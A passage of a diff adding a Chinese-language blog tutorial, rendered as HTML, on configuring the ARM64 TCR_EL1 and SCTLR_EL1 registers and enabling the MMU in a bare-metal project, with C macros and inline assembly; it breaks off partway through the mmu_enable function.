+&lt;p&gt;这几个字段需要与 &lt;code&gt;MAIR_EL1&lt;/code&gt; 区分开。&lt;code&gt;MAIR_EL1&lt;/code&gt; 配合描述符里的 AttrIndx，决定的是翻译完成后访问目标页的属性。MMU 开启后，每次 TLB 未命中，硬件都会自动遍历页表。由于还没有拿到描述符，无法通过 AttrIndx 去查 MAIR，所以读取页表本身的缓存属性要单独写在 &lt;code&gt;TCR_EL1&lt;/code&gt; 的 IRGN0，ORGN0 和 SH0（解释在下一小节）里。&lt;/p&gt;
+&lt;p&gt;这两位的组合如下：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;值&lt;/th&gt;
+&lt;th&gt;含义&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;00&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Normal，不可缓存&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;01&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Normal，写回 + 写分配&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Normal，写通&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;11&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Normal，写回&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;对于 IRGN0 和 ORGN0，本文使用 &lt;code&gt;01&lt;/code&gt;，对于 IRGN1 和 ORGN1 由于已被 EPD1 屏蔽所以保持 &lt;code&gt;00&lt;/code&gt; 即可。&lt;/p&gt;
+&lt;h4 id=&#34;1312-sh0-与-2928-sh1页表遍历的共享域&#34;&gt;&lt;code&gt;[13:12]&lt;/code&gt; SH0 与 &lt;code&gt;[29:28]&lt;/code&gt; SH1：页表遍历的共享域&lt;/h4&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;值&lt;/th&gt;
+&lt;th&gt;含义&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;00&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;非共享&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;外部共享&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;11&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;内部共享&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;区分于描述符里的 SH 负责被映射的数据/代码的共享域，这里 &lt;code&gt;TCR_EL1&lt;/code&gt; 的 SH0 和 SH1 分别指定 TTBR0 和 TTBR1 页表遍历本身的共享域，即读取页表时，硬件要不要和其他核保持缓存一致。SH0 本文填 &lt;code&gt;11&lt;/code&gt; 内部共享。而 SH1 对应高半区，本文不使用，保持 &lt;code&gt;00&lt;/code&gt; 即可。&lt;/p&gt;
+&lt;h4 id=&#34;1514-tg0-与-3130-tg1高低半区的粒度&#34;&gt;&lt;code&gt;[15:14]&lt;/code&gt; TG0 与 &lt;code&gt;[31:30]&lt;/code&gt; TG1：高低半区的粒度&lt;/h4&gt;
+&lt;p&gt;TG0 负责低半区的粒度设置：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;值&lt;/th&gt;
+&lt;th&gt;粒度&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;00&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;4 KB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;01&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;64 KB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;16 KB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;本文将 TG0 置 &lt;code&gt;00&lt;/code&gt;（4 KB）。这一位决定了页内偏移 12 位，每级索引 9 位，也决定了整张 &lt;code&gt;l1_table&lt;/code&gt; 的布局。&lt;/p&gt;
+&lt;p&gt;TG1 的编码和 &lt;code&gt;TG0&lt;/code&gt; 故意不一样：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;值&lt;/th&gt;
+&lt;th&gt;粒度&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;01&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;16 KB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;10&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;4 KB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;11&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;64 KB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;本文将 TG1 置 &lt;code&gt;10&lt;/code&gt;（4 KB）。虽然 &lt;code&gt;EPD1 = 1&lt;/code&gt; 让它不生效，但任然写对避免后续踩坑。&lt;/p&gt;
+&lt;h4 id=&#34;22-a1asid-从哪个-ttbr-取&#34;&gt;&lt;code&gt;[22]&lt;/code&gt; A1：ASID 从哪个 TTBR 取&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;0&lt;/code&gt;：ASID 位于 &lt;code&gt;TTBR0_EL1[63:48]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;1&lt;/code&gt;：ASID 位于 &lt;code&gt;TTBR1_EL1[63:48]&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;本文不用 ASID（只有一个地址空间），保持 &lt;code&gt;0&lt;/code&gt;。&lt;/p&gt;
+&lt;h4 id=&#34;3432-ips物理地址宽度&#34;&gt;&lt;code&gt;[34:32]&lt;/code&gt; IPS：物理地址宽度&lt;/h4&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;值&lt;/th&gt;
+&lt;th&gt;PA 位数&lt;/th&gt;
+&lt;th&gt;可寻址&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;000&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;32&lt;/td&gt;
+&lt;td&gt;4 GB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;001&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;36&lt;/td&gt;
+&lt;td&gt;64 GB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;010&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;40&lt;/td&gt;
+&lt;td&gt;1 TB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;011&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;42&lt;/td&gt;
+&lt;td&gt;4 TB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;100&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;44&lt;/td&gt;
+&lt;td&gt;16 TB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;101&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;48&lt;/td&gt;
+&lt;td&gt;256 TB&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;本文置为 &lt;code&gt;010&lt;/code&gt;（40 位），允许翻译得到的物理地址最大为 2^40 - 1，具体映射范围由页表决定。另外，设置为 40 位会需要设置描述符中 &lt;code&gt;[47:12]&lt;/code&gt; Output Address 中的 &lt;code&gt;[47:40]&lt;/code&gt; 置为 0。由于本项目使用的物理地址都小于 2^40，所以高位自然为 0，无需额外处理。&lt;/p&gt;
+&lt;h4 id=&#34;其余位-1&#34;&gt;其余位&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;[36]&lt;/code&gt; &lt;code&gt;AS&lt;/code&gt; 选择 ASID 的宽度：&lt;code&gt;0&lt;/code&gt; = 8 位，&lt;code&gt;1&lt;/code&gt; = 16 位（可选特性）。本文只有一个地址空间，使用 ASID 0，因此选择 8 位即可。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;[37]&lt;/code&gt; TBI0，&lt;code&gt;[38]&lt;/code&gt; TBI1：翻译时忽略虚拟地址的最高 8 位，这 8 位不再需要满足符号扩展的合法性要求，方便软件在指针高字节里存标记，本项目不使用所以置 0&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;[63:39]&lt;/code&gt; 不启用其余可选功能，置为 0&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;总结-1&#34;&gt;总结&lt;/h4&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;位段&lt;/th&gt;
+&lt;th&gt;名&lt;/th&gt;
+&lt;th&gt;作用&lt;/th&gt;
+&lt;th&gt;本文的值&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[5:0]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;T0SZ&lt;/td&gt;
+&lt;td&gt;低半区 VA 位数 = 64 - T0SZ&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;25&lt;/code&gt;（39 位）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[7]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;EPD0&lt;/td&gt;
+&lt;td&gt;禁止 TTBR0 遍历&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;0&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[9:8]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;IRGN0&lt;/td&gt;
+&lt;td&gt;遍历的内层缓存属性&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;01&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[11:10]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;ORGN0&lt;/td&gt;
+&lt;td&gt;遍历的外层缓存属性&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;01&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[13:12]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;SH0&lt;/td&gt;
+&lt;td&gt;遍历的共享域&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;11&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[15:14]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;TG0&lt;/td&gt;
+&lt;td&gt;低半区粒度&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;00&lt;/code&gt;（4 KB）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[21:16]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;T1SZ&lt;/td&gt;
+&lt;td&gt;高半区 VA 位数&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;25&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[22]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;A1&lt;/td&gt;
+&lt;td&gt;ASID 来源&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;0&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[23]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;EPD1&lt;/td&gt;
+&lt;td&gt;禁止 TTBR1 遍历&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[31:30]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;TG1&lt;/td&gt;
+&lt;td&gt;高半区粒度&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;10&lt;/code&gt;（4 KB）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[34:32]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;IPS&lt;/td&gt;
+&lt;td&gt;物理地址宽度&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;010&lt;/code&gt;（40 位）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;其余&lt;/td&gt;
+&lt;td&gt;保留&lt;/td&gt;
+&lt;td&gt;保持 0&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;0&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;从而可以定义：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define TCR_VALUE (                                                 \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    (25ULL &amp;lt;&amp;lt; 0)    |   &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* T0SZ  = 25   39 bit VA                   */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* TG0 = 00 (4 KB granule), omitted since it is the default     */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    (0b01ULL  &amp;lt;&amp;lt; 8) |   &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* IRGN0 = 01   Inner Write-Back, RA/WA     */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    (0b01ULL  &amp;lt;&amp;lt; 10)|   &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* ORGN0 = 01   Outer Write-Back, RA/WA     */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    (0b11ULL  &amp;lt;&amp;lt; 12)|   &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* SH0   = 11   Inner Shareable             */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    (25ULL &amp;lt;&amp;lt; 16)   |   &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* T1SZ  = 25   TTBR1 unused, keep valid    */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    (0b1ULL  &amp;lt;&amp;lt; 23) |   &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* EPD1  = 1    Disable TTBR1 walks         */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    (0b10ULL  &amp;lt;&amp;lt; 30)|   &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* TG1   = 10   4 KB granule (not 00)       */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    (0b010ULL  &amp;lt;&amp;lt; 32)   &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* IPS   = 010  40 bit physical address     */&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;CPU 复位后 &lt;code&gt;TCR_EL1&lt;/code&gt; 部分配置字段的复位值是 UNKNOWN，所以必须整体赋值，不能只 OR 几位。&lt;/p&gt;
+&lt;h2 id=&#34;第三步打开-mmu&#34;&gt;第三步：打开 MMU&lt;/h2&gt;
+&lt;h3 id=&#34;sctlr_el1系统控制寄存器&#34;&gt;&lt;code&gt;SCTLR_EL1&lt;/code&gt;：系统控制寄存器&lt;/h3&gt;
+&lt;p&gt;System Control Register (EL1) 是 EL1 下控制 CPU 整体行为的总开关寄存器，MMU 的开关就在这里。&lt;/p&gt;
+&lt;p&gt;我们需要主要的有三位：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;位段&lt;/th&gt;
+&lt;th&gt;名字&lt;/th&gt;
+&lt;th&gt;作用&lt;/th&gt;
+&lt;th&gt;本文的值&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[0]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;M&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;MMU 总开关&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[2]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;C&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;数据缓存控制。为 0 时，本文配置下的 Normal 内存数据访问按不可缓存处理&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;[12]&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;I&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;指令缓存&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;其余&lt;/td&gt;
+&lt;td&gt;保留 / RES1&lt;/td&gt;
+&lt;td&gt;保持读出时的值，不碰&lt;/td&gt;
+&lt;td&gt;—&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;定义三个宏：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// SCTLR_EL1 bits
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SCTLR_M (1ULL &amp;lt;&amp;lt; 0)  &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// MMU enable
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SCTLR_C (1ULL &amp;lt;&amp;lt; 2)  &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Cache enable
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SCTLR_I (1ULL &amp;lt;&amp;lt; 12) &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Instruction cache enable
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;启动函数&#34;&gt;启动函数&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mmu_enable&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    __asm__ &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msr mair_el1, %0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;(MAIR_VALUE));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    __asm__ &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msr tcr_el1, %0&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;(TCR_VALUE));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    __asm__ &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;msr ttbr0_el1, %0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;((&lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt;)l1_table));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// dsb: wait until all earlier memory writes (including the page table entries) have completed,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  	&lt;span style=&#34;color:#75715e&#34;&gt;// so the MMU&amp;#39;s table walker can see them
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    __asm__ &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dsb sy&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:::&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// isb: flush the pipeline so later instructions are fetched only after 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// the system register writes above have taken effect
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    __asm__ &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;isb&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// Read-modify-write: SCTLR_EL1 has RES1 bits that must stay 1,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// so don&amp;#39;t overwrite it with a constant
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint64_t&lt;/span&gt; sctlr;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    __asm__ &lt;span style=&#34;color:#66d9ef&#34;&gt;volatile&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mrs %0, sctlr_el1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=r&amp;#34;&lt;/span&gt;(sctlr));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    sctlr &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; SCTLR_M &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; SCTLR_C &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; SCTLR_I;
